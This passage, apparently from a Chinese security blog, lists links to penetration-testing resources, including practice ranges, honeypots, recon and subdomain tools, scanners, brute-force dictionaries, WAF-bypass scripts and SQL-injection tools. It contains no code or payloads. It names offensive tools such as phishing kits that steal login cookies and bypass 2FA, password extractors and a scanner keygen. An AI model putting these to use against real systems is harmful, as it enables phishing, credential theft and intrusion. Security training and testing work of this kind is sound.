rel="noopener">Micro8-HTML</a></p><p>PayloadsAllTheThings/BOOKS<br><a href="https://github.com/dylan903/PayloadsAllTheThings/blob/master/BOOKS.md" target="_blank" rel="noopener">https://github.com/dylan903/PayloadsAllTheThings/blob/master/BOOKS.md</a></p><p>CTF竞赛入门指南：CTF-All-In-One<br><a href="https://github.com/firmianay/CTF-All-In-One" target="_blank" rel="noopener">https://github.com/firmianay/CTF-All-In-One</a></p><h2 id="工具整合"><a href="#工具整合" class="headerlink" title="工具整合"></a>工具整合</h2><hr><p>K8tools<br><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><p>安全行业从业者自研开源扫描器合辑<br><a href="https://github.com/dylan903/Scanners-Box" target="_blank" rel="noopener">https://github.com/dylan903/Scanners-Box</a><br><a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></p><p>渗透以及web攻击脚本<br><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集<br><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack_tools_for_me</a></p><p>渗透常用小工具包<br><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p><p>安全工具集合<br><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p><p>网络基础设施渗透工具<br><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p><p>Interactive CTF Exploration Tool<br><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a></p><p>hacktronian，适用于Linux和Android的一体化黑客工具包<br><a href="https://github.com/thehackingsage/hacktronian" target="_blank" rel="noopener">https://github.com/thehackingsage/hacktronian</a></p><h2 id="红队资源"><a href="#红队资源" class="headerlink" title="红队资源"></a>红队资源</h2><hr><p>红队资料集锦 - lsh4ck’s Blog<br><a href="https://www.lshack.cn/772/" target="_blank" rel="noopener">https://www.lshack.cn/772/</a></p><p>Wiki to collect Red Team infrastructure hardening resources<br><a href="https://github.com/dylan903/Red-Team-Infrastructure-Wiki" target="_blank" rel="noopener">Red-Team-Infrastructure-Wiki</a></p><p>Offensive PowerShell for red team, penetration testing and offensive security.<br><a href="https://github.com/dylan903/nishang" target="_blank" rel="noopener">nishang</a></p><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><hr><p>安全思维导图集合<br><a href="https://github.com/dylan903/sec-chart" target="_blank" rel="noopener">sec-chart</a></p><p>☯️ 网络安全基础知识思维导图、大学笔记<br><a href="https://github.com/dylan903/network-security-mind-map" target="_blank" rel="noopener">network-security-mind-map</a></p><p> 各种安全相关思维导图整理收集<br><a href="https://github.com/dylan903/Mind-Map" target="_blank" rel="noopener">Mind-Map</a></p><h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><h2 id="渗透系统"><a href="#渗透系统" class="headerlink" title="渗透系统"></a>渗透系统</h2><p>泽少个人渗透系统 7.0版<br><a href="https://github.com/Gh0st-404/Zs-Personal-Infiltration-Syste" target="_blank" rel="noopener">https://github.com/Gh0st-404/Zs-Personal-Infiltration-Syste</a></p><p>Pentest Box<br><a href="https://pentestbox.org/zh/" target="_blank" rel="noopener">https://pentestbox.org/zh/</a></p><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><h3 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h3><hr><p>hack the box<br><a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a><br><a href="https://blog.csdn.net/u010953692/article/details/82024150" target="_blank" rel="noopener">hack the box 注册 邀请码 破解</a></p><p>hackinglab：网络安全实验室|网络信息安全攻防学习平台<br><a href="http://hackinglab.cn/index.php" target="_blank" rel="noopener">http://hackinglab.cn/index.php</a></p><p>南邮CG-CTF<br><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges#Web</a></p><p>在线靶场_墨者学院<br><a href="https://www.mozhe.cn/bug" target="_blank" rel="noopener">https://www.mozhe.cn/bug</a></p><p>攻防世界<br><a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">https://adworld.xctf.org.cn/</a></p><p>XSS靶场_免费xss测试平台_Web渗透测试_前段黑客技术学习<br>地址：<br><a href="http://xss.fbisb.com/xss.php?do=login" target="_blank" rel="noopener">http://xss.fbisb.com/xss.php?do=login</a><br><a href="http://xss.tesla-space.com/" target="_blank" rel="noopener">http://xss.tesla-space.com/</a><br><a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a><br>writeup：<br><a href="https://blog.csdn.net/xlsj228/article/details/93166486" target="_blank" rel="noopener">https://blog.csdn.net/xlsj228/article/details/93166486</a><br><a href="https://blog.csdn.net/qq_41500251/article/details/101116697" target="_blank" rel="noopener">https://blog.csdn.net/qq_41500251/article/details/101116697</a></p><p>xss-demo（小迪XSS）: 在线做题，issues 有答案<br><a href="https://github.com/haozi/xss-demo" target="_blank" rel="noopener">https://github.com/haozi/xss-demo</a></p><p>XSS Challenges (by yamagata21)<br>地址：<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a><br>writeup：<a href="https://blog.csdn.net/taozijun/article/details/81277187" target="_blank" rel="noopener">https://blog.csdn.net/taozijun/article/details/81277187</a></p><p>KNOXSS Test Page——练习XSS漏洞的一个靶场<br>地址：<br><a href="https://brutelogic.com.br/knoxss.html" target="_blank" rel="noopener">https://brutelogic.com.br/knoxss.html</a><br>writeup：<br><a href="https://blog.csdn.net/weixin_42936566/article/details/86649481" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42936566/article/details/86649481</a></p><p>HackThis!! - The Hackers Playground<br><a href="https://www.hackthis.co.uk/" target="_blank" rel="noopener">https://www.hackthis.co.uk/</a></p><p>Hack This Site!<br><a href="https://www.hackthissite.org/" target="_blank" rel="noopener">https://www.hackthissite.org/</a></p><h3 id="搭建靶场"><a href="#搭建靶场" class="headerlink" title="搭建靶场"></a>搭建靶场</h3><p>Damn Vulnerable Web Application (DVWA)<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p><p>使用docker快速搭建各大漏洞学习平台，目前可以一键搭建12个平台。<br><a href="https://github.com/dylan903/vulstudy" target="_blank" rel="noopener">vulstudy</a></p><p>vulhub<br><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></p><p>VulApps<br><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><p>Pentester Lab<br><a href="https://pentesterlab.com/" target="_blank" rel="noopener">官网</a><br><a href="https://www.vulnhub.com/entry/pentester-lab-from-sql-injection-to-shell-ii,69/" target="_blank" rel="noopener">下载地址</a><br><a href="https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso" target="_blank" rel="noopener">下载地址</a><br>在VM ware中安装下载的iso镜像并启动<br><a href="https://www.cnblogs.com/ssooking/p/6362571.html" target="_blank" rel="noopener">PentesterLab渗透演练平台使用手册</a><br><a href="https://www.freebuf.com/column/211863.html" target="_blank" rel="noopener">CTF靶场系列-Pentester Lab: Web For Pentester - FreeBuf专栏·幻影安全</a></p><p>xss-labs：XSS跨站漏洞平台<br><a href="https://github.com/lyshark/xss-labs" target="_blank" rel="noopener">https://github.com/lyshark/xss-labs</a></p><p>SQLI labs to test error based, Blind boolean based, Time based.<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场<br><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">https://github.com/c0ny1/upload-labs</a></p><p>DoraBox - 基础Web漏洞训练靶场<br><a href="https://github.com/gh0stkey/DoraBox" target="_blank" rel="noopener">https://github.com/gh0stkey/DoraBox</a></p><p>WebGoat: WebGoat 8.0<br><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p>Linux提取靶场<br><a href="https://github.com/Ignitetechnologies/Privilege-Escalation" target="_blank" rel="noopener">Privilege-Escalation</a></p><h2 id="蜜罐搭建"><a href="#蜜罐搭建" class="headerlink" title="蜜罐搭建"></a>蜜罐搭建</h2><hr><p>HFish-扩展企业安全测试主动诱导型开源蜜罐框架系统，记录黑客攻击手段<br><a href="https://github.com/hacklcx/HFish" target="_blank" rel="noopener">https://github.com/hacklcx/HFish</a></p><p>opencanary_web：一个开源蜜罐框架，基于web python mysql<br><a href="https://github.com/p1r06u3/opencanary_web/" target="_blank" rel="noopener">https://github.com/p1r06u3/opencanary_web/</a></p><p>SSH蜜罐<br><a href="https://github.com/desaster/kippo" target="_blank" rel="noopener">https://github.com/desaster/kippo</a></p><p>蜜罐集合资源<br><a href="https://github.com/paralax/awesome-honeypots" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots</a></p><p>kippo进阶版蜜罐<br><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="noopener">https://github.com/micheloosterhof/cowrie</a></p><p>SMTP 蜜罐<br><a href="https://github.com/awhitehatter/mailoney" target="_blank" rel="noopener">https://github.com/awhitehatter/mailoney</a></p><p>web应用程序蜜罐<br><a href="https://github.com/mushorg/glastopf" target="_blank" rel="noopener">https://github.com/mushorg/glastopf</a></p><p>数据库蜜罐<br><a href="https://github.com/jordan-wright/elastichoney" target="_blank" rel="noopener">https://github.com/jordan-wright/elastichoney</a></p><p>web蜜罐<br><a href="https://github.com/atiger77/Dionaea" target="_blank" rel="noopener">https://github.com/atiger77/Dionaea</a></p><h1 id="0x03-信息收集"><a href="#0x03-信息收集" class="headerlink" title="0x03 信息收集"></a>0x03 信息收集</h1><h2 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h2><hr><p><a href="http://tools.hexlt.org/whatcms" target="_blank" rel="noopener">CMS识别</a><br><a href="http://www.webscan.cc/" target="_blank" rel="noopener">C段查询</a><br><a href="https://www.shodan.io/" target="_blank" rel="noopener">撒旦</a><br><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">钟馗之眼</a><br><a href="https://fofa.so/" target="_blank" rel="noopener">FOFA</a><br><a href="https://www.somd5.com/" target="_blank" rel="noopener">MD5解密</a><br><a href="http://xssor.io/" target="_blank" rel="noopener">XSSOR</a><br><a href="https://regex101.com/" target="_blank" rel="noopener">正则分析</a></p><h2 id="收集教程"><a href="#收集教程" class="headerlink" title="收集教程"></a>收集教程</h2><hr><p>【渗透神器系列】搜索引擎<br><a href="https://www.cnblogs.com/shellr00t/p/6893871.html" target="_blank" rel="noopener">https://www.cnblogs.com/shellr00t/p/6893871.html</a></p><h2 id="收集工具"><a href="#收集工具" class="headerlink" title="收集工具"></a>收集工具</h2><h3 id="网站信息"><a href="#网站信息" class="headerlink" title="网站信息"></a>网站信息</h3><hr><p>FinalRecon：一个用于公开资源情报计划（Open source intelligence ）简称OSINT的网络侦察工具。<br><a href="https://github.com/thewhiteh4t/FinalRecon" target="_blank" rel="noopener">https://github.com/thewhiteh4t/FinalRecon</a></p><p>Rustbuster：一个使用Rust编写的强大的Fuzzer和信息发现工具<br><a href="https://github.com/phra/rustbuster" target="_blank" rel="noopener">https://github.com/phra/rustbuster</a></p><p>FuzzScanner：一主要是用于对网站子域名、开放端口、端口指纹、c段地址、敏感目录等信息进行批量搜集。<br><a href="https://github.com/TideSec/FuzzScanner" target="_blank" rel="noopener">https://github.com/TideSec/FuzzScanner</a></p><p>Photon，速度极快的爬虫程序，可以提取网址、电子邮件、文件、网站帐户等等。<br><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a></p><p>信息探测及扫描工具<br><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器<br><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p><h3 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h3><p>GitMiner：GitHub敏感信息泄露的高级挖掘工具。<br><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a></p><p>gitrob：GitHub敏感信息泄露扫描工具，拥有漂亮的WEB UI。<br><a href="https://github.com/michenriksen/gitrob" target="_blank" rel="noopener">https://github.com/michenriksen/gitrob</a></p><p>FeeiCN/GSIL：Github信息搜集<br><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></p><p>gitGraber：监控GitHub敏感信息数据泄露工具<br><a href="https://github.com/hisxo/gitGraber" target="_blank" rel="noopener">https://github.com/hisxo/gitGraber</a></p><p>GShark:一个用于监控Github敏感信息泄露的项目<br><a href="https://github.com/neal1991/gshark" target="_blank" rel="noopener">https://github.com/neal1991/gshark</a></p><p>gitscan<br><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>GitHarvester：github Repo信息搜集工具<br><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><h3 id="暗网"><a href="#暗网" class="headerlink" title="暗网"></a>暗网</h3><p>DarkScrape：OSINT Tool For Scraping Dark Websites<br><a href="https://github.com/itsmehacker/DarkScrape" target="_blank" rel="noopener">https://github.com/itsmehacker/DarkScrape</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Arjun 一款HTTP参数挖掘套件<br><a href="https://github.com/s0md3v/Arjun/" target="_blank" rel="noopener">https://github.com/s0md3v/Arjun/</a></p><p>SNMAP密码破解<br><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><hr><p>WhatWeb：下一代网络扫描器，用于识别正在运行的网站所使用的技术栈。<br><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>Scan-T：网络空间指纹扫描器<br><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><hr><p>OneForAll<br><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p><p>subDomainsBrute<br><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p>subdomain3<br><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a></p><p>Findomain：使用证书透明度日志查找子域名的工具<br><a href="https://github.com/Edu4rdSHL/findomain" target="_blank" rel="noopener">https://github.com/Edu4rdSHL/findomain</a></p><p>E-mails, subdomains and names Harvester - OSINT<br><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></p><p>Sublist3r<br><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p>subbrute<br><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p><p>altdns<br><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p><h2 id="批量采集"><a href="#批量采集" class="headerlink" title="批量采集"></a>批量采集</h2><hr><p>tcpdump，网络监控和数据采集工具<br><a href="http://www.tcpdump.org/" target="_blank" rel="noopener">http://www.tcpdump.org/</a></p><h1 id="0x04-社工钓鱼"><a href="#0x04-社工钓鱼" class="headerlink" title="0x04 社工钓鱼"></a>0x04 社工钓鱼</h1><h2 id="社工辅助"><a href="#社工辅助" class="headerlink" title="社工辅助"></a>社工辅助</h2><hr><p>infoga：用于从不同公共源（搜索引擎、PGP密钥服务器）收集电子邮件帐户信息的工具。<br><a href="https://github.com/m4ll0k/Infoga" target="_blank" rel="noopener">https://github.com/m4ll0k/Infoga</a></p><p>Sreg：可对使用者通过输入email、phone、username的返回用户注册的所有互联网护照信息。<br><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>The Social-Engineer Toolkit：社会工程学工具包<br><a href="https://github.com/trustedsec/social-engineer-toolkit/" target="_blank" rel="noopener">https://github.com/trustedsec/social-engineer-toolkit/</a></p><p>sherlock：一个在社交网络中查找用户名的信息收集工具<br><a href="https://github.com/sherlock-project/sherlock" target="_blank" rel="noopener">https://github.com/sherlock-project/sherlock</a></p><p>userrecon-py：在187个社交网络中查找用户名。<br><a href="https://github.com/decoxviii/userrecon-py" target="_blank" rel="noopener">https://github.com/decoxviii/userrecon-py</a></p><p>RGPerson：随机中文身份信息生成脚本<br><a href="https://github.com/gh0stkey/RGPerson" target="_blank" rel="noopener">https://github.com/gh0stkey/RGPerson</a></p><h2 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h2><hr><p>HiddenEye：具有高级功能的现代网络钓鱼工具。<br><a href="https://github.com/DarkSecDevelopers/HiddenEye" target="_blank" rel="noopener">https://github.com/DarkSecDevelopers/HiddenEye</a></p><p>SocialFish：与NGROK集成的终极网络钓鱼工具。<br><a href="https://github.com/UndeadSec/SocialFish" target="_blank" rel="noopener">https://github.com/UndeadSec/SocialFish</a></p><p>evilginx2：中间人网络钓鱼攻击框架，用于假冒登录凭证和会话cookie，允许绕过2因素身份验证。<br><a href="https://github.com/kgretzky/evilginx2" target="_blank" rel="noopener">https://github.com/kgretzky/evilginx2</a></p><p>ShellPhish：支持多种社交媒体的网络钓鱼工具<br><a href="https://github.com/thelinuxchoice/shellphish" target="_blank" rel="noopener">https://github.com/thelinuxchoice/shellphish</a></p><h1 id="0x05-扫描工具"><a href="#0x05-扫描工具" class="headerlink" title="0x05 扫描工具"></a>0x05 扫描工具</h1><h2 id="综合扫描"><a href="#综合扫描" class="headerlink" title="综合扫描"></a>综合扫描</h2><hr><p>Acunetix Web Vulnerability Scanner<br><a href="http://www.acunetix.com/" target="_blank" rel="noopener">http://www.acunetix.com/</a></p><p>AppScan</p><p>启明星辰天镜</p><p>绿盟极光<br><a href="http://www.nsfocus.com/" target="_blank" rel="noopener">http://www.nsfocus.com/</a></p><p>安恒 MatriXay WebScan（明鉴）<br><a href="http://www.dbappsecurity.com.cn/" target="_blank" rel="noopener">http://www.dbappsecurity.com.cn/</a></p><p>安域领创 WebRavor<br><a href="http://www.secdomain.com/" target="_blank" rel="noopener">http://www.secdomain.com/</a></p><p>巡风是一款适用于企业内网的漏洞快速应急，巡航扫描系统。<br><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a></p><p>X-scan</p><p>nikto: Nikto web server scanner<br>Nikto是一款开放源代码的、功能强大的WEB扫描评估软件，能对web服务器多种安全项目进行测试的扫描软件，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题，它可以扫描指定主机的WEB类型、主机名、特定目录、COOKIE、特定CGI漏洞、返回主机允许的 http模式等等。<br><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>w3af，web漏洞扫描、应用攻击和审计框架。<br><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p><p>K8CScan<br><a href="https://github.com/k8gege/K8CScan" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan</a></p><p>Vxscan：<br>python3写的综合扫描工具，主要用来存活验证，敏感文件探测(目录扫描/js泄露接口/html注释泄露)，WAF/CDN识别，端口扫描，指纹/服务识别，操作系统识别，POC扫描，SQL注入，绕过CDN，查询旁站等功能，主要用来甲方自测或乙方授权测试<br><a href="https://github.com/al0ne/Vxscan" target="_blank" rel="noopener">https://github.com/al0ne/Vxscan</a></p><p>Perun：Perun是一款网络资产漏洞扫描器/扫描框架<br><a href="https://github.com/WyAtu/Perun" target="_blank" rel="noopener">https://github.com/WyAtu/Perun</a></p><p>WDScanner：分布式web漏洞扫描、客户管理、漏洞定期扫描、子域名枚举、端口扫描、<br>网站爬虫、暗链检测、坏链检测、网站指纹搜集、专项漏洞检测、代理搜集及部署等功能。<br><a href="https://github.com/TideSec/WDScanner" target="_blank" rel="noopener">https://github.com/TideSec/WDScanner</a></p><p>Passive Security Scanner (被动安全扫描器)<br><a href="https://github.com/boy-hack/w13scan" target="_blank" rel="noopener">https://github.com/boy-hack/w13scan</a></p><p>Python3编写的CMS漏洞检测框架<br><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a></p><p>TrackRay: 溯光 (TrackRay) 3 beta⚡渗透测试框架<br><a href="https://github.com/iSafeBlue/TrackRay" target="_blank" rel="noopener">https://github.com/iSafeBlue/TrackRay</a></p><p>SSL扫描器sslscan<br><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>检查网站恶意攻击malspider<br><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p><p>固件漏洞扫描器firminator_backend<br><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p><p>Vulmap：Vulmap可对Linux和Windows系统进行联网本地漏洞扫描<br><a href="https://github.com/vulmon/Vulmap" target="_blank" rel="noopener">https://github.com/vulmon/Vulmap</a></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><hr><p>scanless：一款使用第三方在线平台进行匿名端口扫描的工具。<br><a href="https://github.com/vesche/scanless" target="_blank" rel="noopener">https://github.com/vesche/scanless</a></p><p>F-NAScan：网络资产信息扫描 在渗透测试(<strong>特别是内网</strong>)中经常需要对目标进行网络资产收集<br> ICMP存活探测–&gt;端口开放探测–&gt;端口指纹服务识别–&gt;提取快照(若为WEB)–&gt;生成结果报表<br><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><hr><p>一个高级web目录扫描工具，功能将会强于DirBuster、Dirsearch、cansina、御剑<br><a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p><p>7kbscan-WebPathBrute Web路径暴力探测工具<br><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p><p>御剑WEB目录扫描优化版 KEYGEN<br><a href="https://github.com/dylan903/YUJIANKEYGEN" target="_blank" rel="noopener">YUJIANKEYGEN</a></p><p>web目录扫描器dirsearch<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>Konan，一款高级Web目录扫描程序，多线程/代理/字典子目录。<br><a href="https://github.com/m4ll0k/Konan" target="_blank" rel="noopener">https://github.com/m4ll0k/Konan</a></p><h1 id="0x06-暴力破解"><a href="#0x06-暴力破解" class="headerlink" title="0x06 暴力破解"></a>0x06 暴力破解</h1><h2 id="破解工具"><a href="#破解工具" class="headerlink" title="破解工具"></a>破解工具</h2><hr><p>远程桌面登录扫描器<br><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>一款有图形界面的RDP(3389)口令检测工具<br><a href="https://github.com/7kbstorm/7kbscan-RDP-Sniper" target="_blank" rel="noopener">https://github.com/7kbstorm/7kbscan-RDP-Sniper</a></p><p>WebCrack网站后台弱口令/万能密码批量检测工具<br><a href="https://github.com/yzddmr6/WebCrack" target="_blank" rel="noopener">https://github.com/yzddmr6/WebCrack</a></p><p>DBScanner自动扫描内网常见sql、no-sql数据库脚本<br>(mysql、mssql、oracle、postgresql、redis、mongodb、memcached、elasticsearch)<br>包含未授权访问及常规弱口令检测<br><a href="https://github.com/se55i0n/DBScanner" target="_blank" rel="noopener">https://github.com/se55i0n/DBScanner</a></p><p>一款python编写的轻量级弱口令检测脚本，目前支持以下服务：FTP、MYSQL、MSSQL、MONGODB、REDIS、TELNET、ELASTICSEARCH、POSTGRESQL。<br><a href="https://github.com/qianniaoge/F-Scrack" target="_blank" rel="noopener">https://github.com/qianniaoge/F-Scrack</a></p><p>密码破解工具<br><a href="https://github.com/shinnok/johnny" target="_blank" rel="noopener">https://github.com/shinnok/johnny</a></p><p>本地存储的各类密码提取利器<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h2 id="字典目录"><a href="#字典目录" class="headerlink" title="字典目录"></a>字典目录</h2><hr><p>pydictor是一个强大实用的黑客暴力破解字典生成工具<br><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></p><p>Web Pentesting Fuzz 字典,一个就够了。<br><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p>Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.<br><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb</a></p><p>Blasting_dictionary<br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></p><p>Fuzzing-Dicts  网站后台、文件包含、WebShell等爆破字典！<br><a href="https://github.com/3had0w/Fuzzing-Dicts" target="_blank" rel="noopener">https://github.com/3had0w/Fuzzing-Dicts</a></p><p>常用的一些fuzz及爆破字典，欢迎大神继续提供新的字典及分类。<br><a href="https://github.com/TuuuNya/fuzz_dict" target="_blank" rel="noopener">https://github.com/TuuuNya/fuzz_dict</a></p><p>SecLists is the security tester’s companion. It’s a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.<br><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists</a></p><p>Exploit-Dictionary<br><a href="https://github.com/epony4c/Exploit-Dictionary" target="_blank" rel="noopener">https://github.com/epony4c/Exploit-Dictionary</a></p><p>Common User Passwords Profiler (CUPP)<br><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a></p><h1 id="0x07-抓包改包"><a href="#0x07-抓包改包" class="headerlink" title="0x07 抓包改包"></a>0x07 抓包改包</h1><hr><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>官网<br><a href="https://www.wireshark.org/" target="_blank" rel="noopener">https://www.wireshark.org/</a></p><h2 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h2><p>HackBar plugin for Burpsuite v1.0<br><a href="https://github.com/d3vilbug/HackBar/" target="_blank" rel="noopener">https://github.com/d3vilbug/HackBar/</a></p><p>Mr-xn/BurpSuite-collections: BurpSuite收集：包括不限于 Burp 文章、破解版、插件(非BApp Store)、汉化等相关教程<br><a href="https://github.com/Mr-xn/BurpSuite-collections" target="_blank" rel="noopener">https://github.com/Mr-xn/BurpSuite-collections</a></p><p>burpsuit之J2EE扫描插件<br><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="0x08-Bypass"><a href="#0x08-Bypass" class="headerlink" title="0x08 Bypass"></a>0x08 Bypass</h1><hr><p>wafw00f，识别和识别保护网站的Web应用程序防火墙（WAF）产品。<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>一款开源WAF<br><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>自动化绕过WAF脚本<br><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a><br><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p><h1 id="0x09-注入攻击"><a href="#0x09-注入攻击" class="headerlink" title="0x09 注入攻击"></a>0x09 注入攻击</h1><h2 id="注入教程"><a href="#注入教程" class="headerlink" title="注入教程"></a>注入教程</h2><hr><p><a href="https://www.cnblogs.com/ssooking/p/8137597.html" target="_blank" rel="noopener">SQL注入学习资料总结</a></p><h2 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h2><hr><p>一个用于SQL数据库自动注入的Java应用程序。<br><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a></p><p>数据库注入工具<br><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>自动化SQL注入检查工具<br><a 